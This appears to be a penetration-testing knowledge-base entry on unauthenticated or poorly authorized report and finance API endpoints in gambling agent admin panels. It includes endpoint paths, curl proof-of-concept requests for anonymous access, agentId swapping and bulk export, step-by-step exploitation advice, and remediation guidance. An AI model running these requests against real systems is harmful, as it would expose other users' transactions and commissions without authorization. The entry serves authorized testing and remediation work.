---
id: "report-api-unauth"
title: "Unauthenticated report/finance endpoints (site-wide transactions and agent commissions)"
kind: "business-logic"
cve: null
related-cves: null
cve-note: "None (business logic)"
severity: "high"
cvss: 8.6
severity-basis: "cvss"
severity-note: null
product: "Reporting modules in turnkey gambling/agent admin panels"
versions: "Any"
ports: "80, 443"
keywords: "report, finance, reports, transactions, commissions, unauthenticated access"
entry: "/api/report/* without authentication or with an ordinary token"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (business logic flaws; no CVE)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

```
/api/report/bet        /api/report/finance       /api/report/agent
/api/finance/order     /api/admin/report/export
Parameters: startDate, endDate, agentId, pageSize
```

## Prerequisites

- An ordinary account (or no authentication at all, depending on deployment).

## PoC

```bash
# 1) First try without authentication
curl -s 'https://target/api/report/bet?startDate=2024-11-01&endDate=2024-11-05&pageSize=10'
# 200 + data ⇒ unauthenticated access

# 2) Ordinary token + changed agentId
curl -s 'https://target/api/report/agent?agentId=1&startDate=2024-11-01' -H "Authorization: Bearer <ordinary-token>"

# 3) Export endpoint (often lacks authorization and can return the full dataset at once)
curl -s 'https://target/api/report/export?startDate=2024-01-01&endDate=2024-11-05' -o dump.xlsx
```

## Exploitation Steps

1. Make one pass without a token, then one with an ordinary token; compare 200/403 responses.
2. If successful, change `agentId`/`uid` to obtain other users' agent trees and transactions (alongside `agent-hierarchy-privilege.md`).
3. Prioritize export endpoints: obtaining site-wide orders/withdrawals/commissions at once is faster than paging through lists.
4. Use data to demonstrate impact (member counts, transaction volume); **do not export the entire contents**.
5. Evidence: one list request + returned total count + field screenshot (redacted).

## Remediation and Mitigation

- Apply consistent authorization + row-level filtering to report endpoints (return only the caller's agent tree).
- Use asynchronous export jobs + permission checks + watermarks; rate-limit large reports.
- Audit who exported how many rows and when.

## References

- OWASP API Security Top 10: API1 BOLA / API5 BFLA.
